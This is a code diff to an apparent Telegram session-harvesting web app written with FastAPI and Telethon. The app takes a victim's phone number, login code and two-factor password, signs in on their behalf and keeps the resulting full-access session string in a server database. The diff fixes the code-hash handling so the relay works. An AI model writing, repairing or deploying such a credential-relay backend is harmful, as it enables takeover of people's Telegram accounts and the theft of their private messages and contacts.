@@ -1,7 +1,7 @@
 import os
 import sqlite3
 from datetime import datetime
-from fastapi import FastAPI, Request, Form, HTTPException
+from fastapi import FastAPI, Request, Form
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
 from telethon import TelegramClient
@@ -22,6 +22,7 @@ def init():
     conn = sqlite3.connect(DB)
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
     conn.execute("CREATE TABLE IF NOT EXISTS attempts (phone TEXT, count INT, time TEXT)")
+    conn.execute("CREATE TABLE IF NOT EXISTS code_hashes (phone TEXT UNIQUE, hash TEXT, time TEXT)")  # ← NEW
     conn.commit()
     conn.close()
 init()
@@ -39,6 +40,7 @@ def save_session(phone, session):
     conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, ?)",
                  (phone, session, datetime.utcnow().isoformat()))
     conn.execute("DELETE FROM attempts WHERE phone = ?", (phone,))
+    conn.execute("DELETE FROM code_hashes WHERE phone = ?", (phone,))
     conn.commit()
     conn.close()
 
@@ -65,6 +67,28 @@ def clear_attempts(phone):
     conn.commit()
     conn.close()
 
+# === CODE HASH (NEW) ===
+def save_code_hash(phone, code_hash):
+    conn = sqlite3.connect(DB)
+    conn.execute("REPLACE INTO code_hashes (phone, hash, time) VALUES (?, ?, ?)",
+                 (phone, code_hash, datetime.utcnow().isoformat()))
+    conn.commit()
+    conn.close()
+
+def get_code_hash(phone):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute("SELECT hash FROM code_hashes WHERE phone = ?", (phone,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
+
+def delete_code_hash(phone):
+    conn = sqlite3.connect(DB)
+    conn.execute("DELETE FROM code_hashes WHERE phone = ?", (phone,))
+    conn.commit()
+    conn.close()
+
 # === ROUTES ===
 @app.get("/", response_class=HTMLResponse)
 async def home(request: Request):
@@ -75,10 +99,12 @@ async def home(request: Request):
 async def send_code(phone: str = Form(...)):
     if phone_exists(phone):
         return JSONResponse({"error": "You already have a session. Contact admin."})
+    
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
-        await client.send_code_request(phone)
+        sent_code = await client.send_code_request(phone)
+        save_code_hash(phone, sent_code.phone_code_hash)  # ← SAVE TO DB
         await client.disconnect()
         clear_attempts(phone)
         return JSONResponse({"ok": True})
@@ -94,20 +120,23 @@ async def verify_code(phone: str = Form(...), code: str = Form(...)):
     if attempts > 3:
         return JSONResponse({"error": "Too many attempts. <button onclick=\"resend()\">Resend Code</button>"})
 
+    code_hash = get_code_hash(phone)
+    if not code_hash:
+        return JSONResponse({"error": "Session expired. Click Resend Code."})
+
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
-        await client.sign_in(phone, code)
-        session_str = client.session.save()  # THIS LINE WAS MISSING
+        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
+        session_str = client.session.save()
         await client.disconnect()
         save_session(phone, session_str)
+        delete_code_hash(phone)
         return JSONResponse({"session": session_str})
     except SessionPasswordNeededError:
         return JSONResponse({"needs_password": True})
     except PhoneCodeInvalidError:
         return JSONResponse({"error": f"Wrong code. Attempt {attempts}/3"})
-    except FloodWaitError as e:
-        return JSONResponse({"error": f"Wait {e.seconds}s"})
     except Exception as e:
         return JSONResponse({"error": str(e)})
     finally:
@@ -118,13 +147,18 @@ async def verify_code(phone: str = Form(...), code: str = Form(...)):
 async def password(phone: str = Form(...), code: str = Form(...), pwd: str = Form(...)):
     if phone_exists(phone):
         return JSONResponse({"error": "Session exists."})
+    code_hash = get_code_hash(phone)
+    if not code_hash:
+        return JSONResponse({"error": "Session expired."})
+
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
-        await client.sign_in(phone, code, password=pwd)
+        await client.sign_in(phone=phone, code=code, password=pwd, phone_code_hash=code_hash)
         session_str = client.session.save()
         await client.disconnect()
         save_session(phone, session_str)
+        delete_code_hash(phone)
         return JSONResponse({"session": session_str})
     except Exception as e:
         return JSONResponse({"error": str(e)})
